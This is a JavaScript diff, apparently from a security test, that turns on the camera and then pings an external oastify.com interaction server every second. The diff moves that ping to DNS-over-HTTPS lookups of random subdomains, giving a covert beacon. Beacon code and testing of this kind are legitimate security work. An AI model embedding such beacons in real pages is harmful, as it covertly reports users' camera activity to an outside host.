@@ -11,6 +11,11 @@
     let stream = null;
     let pingInterval = null;
 
+    function getRandomNumber() {
+      // Generates a random number (between 1000 and 9999 for example)
+      return Math.floor(Math.random() * 9000) + 1000;
+    }
+
     function startCamera() {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(s => {
@@ -18,13 +23,25 @@
           document.getElementById('video').srcObject = stream;
           console.log("Camera access granted.");
 
-          // Start pinging every second
+          // Start pinging every second via DNS lookup
           pingInterval = setInterval(() => {
             if (stream && stream.active) {
-              // Send a ping to the OAST domain every second
-              fetch('https://0bc1obwrqcmepy35lla01za2rtxkla9z.oastify.com/ping?' + Date.now())
-                .then(() => console.log("Ping sent."))
-                .catch(() => console.warn("Ping failed."));
+              // Generate a random number and form the subdomain
+              const randomSubdomain = `${getRandomNumber()}.0bc1obwrqcmepy35lla01za2rtxkla9z.oastify.com`;
+
+              // Perform DNS query to resolve the random subdomain using DNS-over-HTTPS
+              const dnsUrl = `https://dns.google/resolve?name=${randomSubdomain}&type=A`;
+
+              fetch(dnsUrl)
+                .then(response => response.json())
+                .then(data => {
+                  if (data.Status === 0 && data.Answer) {
+                    console.log("DNS lookup successful:", data.Answer);
+                  } else {
+                    console.warn("DNS lookup failed for:", randomSubdomain);
+                  }
+                })
+                .catch(err => console.error("DNS request failed:", err));
             } else {
               clearInterval(pingInterval);
               console.log("Camera stream inactive. Stopping ping.");
